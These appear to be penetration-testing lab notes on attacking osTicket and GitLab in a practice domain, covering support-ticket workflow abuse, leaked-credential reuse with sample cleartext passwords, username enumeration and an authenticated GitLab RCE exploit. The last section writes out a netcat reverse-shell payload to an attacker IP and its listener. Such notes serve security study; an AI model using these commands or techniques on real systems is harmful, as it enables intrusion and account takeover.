## 1- osTicket

osTicket is an open-source support ticketing system (PHP + MySQL) used by companies, schools, universities, and governments for handling customer inquiries. It integrates emails, phone requests, and web forms into a unified interface.
- Often overlooked during assessments but extremely useful for **social engineering**, enumeration, and data exposure.
- Few historical CVEs → secure platform, but **the workflow itself** can be abused.
## Footprinting / Discovery / Enumeration
osTicket is easily identifiable by:
- Cookie: **OSTSESSID**
- Footer text: **“powered by osTicket”**, **“Support Ticket System”**
- Logo appearing on homepage
- EyeWitness screenshots reveal it clearly
![[Pasted image 20251205140740.png]]
**Nmap Footprinting:** Nmap only identifies the **web server**, not osTicket itself.

 #### How osTicket Works (Useful for Attacks)

**1- User Input**
- Users submit issues to the support team.
- Being open-source gives attackers access to docs & behavior.
- Social engineering possible:  
    Fake a problem → ask support → extract info from the staff.

**2- Processing**
- Staff reproduce issues internally.
- They work in environments similar to production → may reveal system details.

**3-Solution**
Solving tickets results in:
- New exposed **email addresses**
- Potential **usernames**
- Internal comms or leaked passwords  
    These can be reused in attacks like OSINT or credential stuffing.
#### Attacking osTicket
Exploit-DB shows many historical issues:
- RFI, SQLi, File Upload, XSS, etc.
- **CVE-2020-24881** — SSRF → internal scans or resource access.

**Workflow Abuse Example**

Support portals can help attackers:
- Obtain **company email addresses**
- Use these emails to register on other portals that require verification  
    (e.g., Slack, GitLab, Wiki, Mattermost, Bitbucket)

 Example Attack:
1. Submit a new ticket
2. osTicket assigns an internal email like:  
    `940288@inlanefreight.local`
![[Pasted image 20251205141226.png]]
==If the helpdesk software links the ticket number (940288) to an email address, then anything sent to `940288@inlanefreight.local` will appear inside that ticket.==
![[Pasted image 20251205141351.png]]
3. Use that email to register on external systems
4. Receive the verification email inside osTicket
5. Gain access to internal services
This is **not a vulnerability**, but **a workflow abuse attack**.

####  Sensitive Data Exposure
Using tools like Dehashed or https://oathnet.org , we may find leaked emails + passwords:
```bash
sudo python3 dehashed.py -q inlanefreight.local -p
  # Found cleartext passwords
  # email : julie.clayton@inlanefreight.local
  # username : jclayton
  # password : JulieC8765!

  # email : kevin@inlanefreight.local
  # username : kgrimes
  # password : Fish1ng_s3ason!
```
**Subdomain Enumeration:**
```bash
cat ilfreight_subdomains
  # support.inlanefreight.local
  # vpn.inlanefreight.local
  # apps.inlanefreight.local
  # ...
```
Key findings:
- `support.inlanefreight.local` → osTicket
- `vpn.inlanefreight.local` → SSL VPN with **no multi-factor authentication**

**Credential Testing:**
Try leaked credentials on osTicket:
- `jclayton` → fails
- `kgrimes` → fails
- `kevin@inlanefreight.local` → **success!**

**authenticated osTicket Enumeration:**
we login to the osTicket Inside the Portal We find:
- Closed tickets containing internal conversations
- Exposed **password resets**
- Sensitive user details - This password can be tried on the VPN or other accounts
- - Many companies reuse default passwords → candidate for **password spraying** 
![[Pasted image 20251205142124.png]]
![[Pasted image 20251205142139.png]]
**Additional Enumeration**:
Apps like osTicket often contain:
- Address books
- Contact lists  
    → Exportable for creating username lists for attacks.

####  Closing Thoughts
Support portals are high-value targets. Even when not vulnerable, they can leak:
- Internal emails
- Default passwords
- Employee communications
- Password reset instructions
**Mitigations:**
- Limit what applications are exposed externally
- Enforce multi-factor authentication on all external portals
- Provide security awareness training to all employees and advise them not to use their corporate emails to sign up for third-party services
- Enforce a strong password policy in Active Directory and on all applications, disallowing common words such as variations of `welcome`, and `password`, the company name, and seasons and months
- Require a user to change their password after their initial login and periodically expire user's passwords



---

## 2- Gitlab - Discovery & Enumeration
GitLab is an open-source Git repository platform similar to GitHub and BitBucket. It includes wikis, issue tracking, and CI/CD pipelines. Companies often store code, configs, and sometimes sensitive data like passwords or SSH keys in their repositories. Public, internal, and private repos may all contain useful information. If registration is open, attackers can often create accounts and access internal repos.

#### Footprinting & Discovery


- You can identify GitLab just by visiting its URL and seeing the login page. 
- The **version number** is only visible on `/help` **after logging in**.
- If sign-ups are allowed, **create an account and check the version.** If we have no way to enumerate the version number (such as a date on the page, the first public commit, or by registering a user),
- if you can't register new account try access the `/explore` dir click on `what's new ` on the right , and check the version
![[Pasted image 20251205152749.png]]
- There have been a few serious exploits against GitLab [12.9.0](https://www.exploit-db.com/exploits/48431) and GitLab [11.4.7](https://www.exploit-db.com/exploits/49257) in the past few years as well as GitLab Community Edition [13.10.3](https://www.exploit-db.com/exploits/49821), [13.9.3](https://www.exploit-db.com/exploits/49944), and [13.10.2](https://www.exploit-db.com/exploits/49951). we may have to try a low-risk exploit such as [this (user enum)](https://www.exploit-db.com/exploits/49821)
#### Enumeration
- If not logged in, start by checking `/explore` for public projects that might contain credentials, configs, or keys. Explore groups, snippets, and use the search function.
```
http://gitlab.inlanefreight.local:8081/explore
```
![[Pasted image 20251205151257.png]]
- If we can make a list of valid users with ( **username enumeration + enumerate emails**) by register with an email that has already been taken, we will get the error `1 error prohibited this user from being saved: Email has already been taken`. As of the time of writing, this username enumeration technique works with the latest version of GitLab, then we could attempt to guess weak passwords or possibly re-use credentials that we find from a password dump 
![[Pasted image 20251205151811.png]]

- **If sign-ups are allowed, register and access more internal projects**. GitLab’s registration page can also leak valid usernames and emails through error messages. Once inside, more internal repos may reveal source code or sensitive data. Mitigations include enforcing 2FA, Fail2Ban, and IP restrictions.

As this [blog post](https://tillsongalloway.com/finding-sensitive-information-on-github/index.html) explains, there is a considerable amount of data that we may be able to uncover on GitLab, GitHub, etc.
#### Onwards
enumeration is extremely important. Even if GitLab itself isn't exploitable, the information inside repositories can be highly valuable and may be combined with other findings to enable further attacks.


---




## 3- Attacking GitLab

GitLab can expose sensitive data even without authentication. With valid user or admin access, attackers may fully compromise the organization. GitLab has **553 CVEs**, including several severe RCE vulnerabilities.

#### Username Enumeration
GitLab allows **user enumeration** (not considered a vulnerability by GitLab). Useful for identifying valid accounts for later password attacks.
Tools mentioned:
- We can write one ourselves in Bash or Python or use this one https://www.exploit-db.com/exploits/49821  to enumerate a list of valid users.
- Python3 version  : https://github.com/dpgg101/GitLabUserEnum

**GitLab Lockout Defaults (below v16.6):**
- 10 failed login attempts
- Unlock after 10 minutes  
    Starting in **v16.6**, admins can configure:
- `max_login_attempts`
- `failed_login_attempts_unlock_period_in_minutes`
 Example Output (valid usernames found):
```bash
./gitlab_userenum.sh --url http://gitlab.local:8081/ --userlist users.txt
  # [+] The username root exists!
  # [+] The username bob exists!
```
####  Authenticated Remote Code Execution
GitLab CE **13.10.2 and lower** had an authenticated RCE vulnerability caused by **ExifTool handling uploaded image metadata**.
Exploit used:  
[https://www.exploit-db.com/exploits/49951](https://www.exploit-db.com/exploits/49951)
If self‑registration is enabled, attackers can create an account and execute the exploit.

 Running the exploit with the GitLab creds 
```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'
  # Successfully Authenticated
  # RCE Triggered !!
```
 Reverse shell received
```bash
nc -lnvp 8443
  # id > pwn
```



